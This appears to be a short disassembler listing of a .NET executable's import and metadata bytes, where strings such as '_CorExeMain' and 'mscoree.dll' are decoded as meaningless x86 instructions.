  402b8c:	01 00                	add    %eax,(%eax)
  402b8e:	01 00                	add    %eax,(%eax)
  402b90:	54                   	push   %esp
  402b91:	02 16                	add    (%esi),%dl
  402b93:	57                   	push   %edi
  402b94:	72 61                	jb     0x402bf7
  402b96:	70 4e                	jo     0x402be6
  402b98:	6f                   	outsl  %ds:(%esi),(%dx)
  402b99:	6e                   	outsb  %ds:(%esi),(%dx)
  402b9a:	45                   	inc    %ebp
  402b9b:	78 63                	js     0x402c00
  402b9d:	65 70 74             	gs jo  0x402c14
  402ba0:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  402ba7:	77 73                	ja     0x402c1c
  402ba9:	01 00                	add    %eax,(%eax)
  402bab:	00 d4                	add    %dl,%ah
  402bad:	2b 00                	sub    (%eax),%eax
	...
  402bb7:	00 ee                	add    %ch,%dh
  402bb9:	2b 00                	sub    (%eax),%eax
  402bbb:	00 00                	add    %al,(%eax)
  402bbd:	20 00                	and    %al,(%eax)
	...
  402bd3:	00 e0                	add    %ah,%al
  402bd5:	2b 00                	sub    (%eax),%eax
	...
  402bdf:	00 00                	add    %al,(%eax)
  402be1:	00 5f 43             	add    %bl,0x43(%edi)
  402be4:	6f                   	outsl  %ds:(%esi),(%dx)
  402be5:	72 45                	jb     0x402c2c
  402be7:	78 65                	js     0x402c4e
  402be9:	4d                   	dec    %ebp
  402bea:	61                   	popa
  402beb:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  402bf2:	72 65                	jb     0x402c59
  402bf4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  402bf8:	6c                   	insb   (%dx),%es:(%edi)
  402bf9:	00 00                	add    %al,(%eax)
  402bfb:	00 00                	add    %al,(%eax)
  402bfd:	00 ff                	add    %bh,%bh
  402bff:	25 00 20 40 00       	and    $0x402000,%eax
